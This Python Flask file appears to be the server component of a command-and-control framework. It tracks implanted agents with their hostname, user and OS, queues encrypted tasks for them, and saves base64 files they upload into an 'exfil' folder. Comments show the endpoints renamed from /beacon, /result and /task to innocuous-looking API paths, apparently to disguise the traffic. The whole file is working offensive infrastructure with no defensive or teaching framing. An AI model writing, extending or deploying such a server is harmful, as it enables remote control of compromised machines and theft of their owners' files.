from flask import Flask, request, jsonify
from common.cryptography_helpers import encrypt_string, decrypt_string
import time
import os
import base64
import json

app = Flask(__name__)

tasks = {} #in-memory task list
agents = {}
AGENT_TIMEOUT = 60

EXFIL_DIR = "exfil"
os.makedirs(EXFIL_DIR, exist_ok = True)


@app.route('/api/status', methods=['POST']) # old /beacon
def status():
    data = request.json
    agent_id = request.json.get('id')
    meta = data.get('meta', {})
    
    if not agent_id:
        return jsonify({"error": "missing id"}), 400
    
    agents[agent_id] = {
        "hostname" : meta.get("hostname"),
        "os" : meta.get("os"),
        "user" : meta.get("user"),
        "last_seen" : time.time()
    }
    
    if agent_id in tasks and tasks[agent_id]:
        task = tasks[agent_id][0]
        encrypted_task = encrypt_string(task)
        task = tasks[agent_id].pop(0)
        return jsonify({"task": encrypted_task})
    else: 
        return jsonify({"task" : None})
    
    
@app.route('/api/upload', methods=['POST']) # old /result 
def result():
    agent_id = request.json.get('id')
    output = request.json.get('output')
    MAX_EXFIL_SIZE = 5 * 1024 * 1024 # 5 MB Max
    try:
            plaintext = decrypt_string(output)
            data = json.loads(plaintext)
     
            if data.get("status") == "success" and "data" in data and "filename" in data:
                
                encoded_data = data["data"]
                
                if len(encoded_data) > MAX_EXFIL_SIZE * 2 :
                    print("[!] Exfil rejected: encoded payload too large")
                    return jsonify({"status": "received"})
                

                file_bytes = base64.b64decode(encoded_data, validate=True)
                if len(file_bytes) > MAX_EXFIL_SIZE:
                    print("[!] Exfil rejected: file too large")
                    return jsonify({"status": "received"}) 
                
                
                filename = os.path.basename(data["filename"])
                save_path = os.path.join(EXFIL_DIR, f"{agent_id}_{filename}")
                
                
                with open(save_path, "wb") as f:
                    f.write(file_bytes)
                    
                print(f"[+] Exfil saved to {save_path}")
            else:
                print(f"[+] Result from {agent_id} : {data}")
    except Exception as e :
        print("[!] Upload processing failed: {e}")
    return jsonify({"status": "received"})


@app.route('/api/push', methods=['POST']) # old /task
def push_task():
    data = request.json
    agent_id = data.get('id')
    task = data.get('task')
    
    if not agent_id or not task:
        return jsonify({"error": "Missing id or task"}), 400
    
    if agent_id not in agents:
        return jsonify({"error": "Unknown agent"}), 404
    
    MAX_TASKS_PER_AGENT = 100
    queue = tasks.setdefault(agent_id, [])
    if len(queue) >= MAX_TASKS_PER_AGENT:
        return jsonify({"error": "Task Queue Full"}), 429
    
    try: 
        parsed = json.loads(task)
    except json.JSONDecodeError:
        return jsonify({"error": "Task must be valid JSON"}), 400

    if "type" not in parsed:
        return jsonify({"error": "Task missing 'type' field"}), 400
    
    queue.append(task)
 
    return jsonify({"status": "task queued"})


@app.route('/api/agents', methods = ['GET'])
def list_agents():
    current_time = time.time()
    enriched_agents = {}
    
    for agent_id, meta in agents.items():
        last_seen = meta.get("last_seen", 0)
        status = "online" if current_time - last_seen <= AGENT_TIMEOUT else "offline"
        enriched_agents[agent_id] = {
            **meta,
            "status" : status
        }
    return jsonify(enriched_agents)
        
         
        
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)



    
  




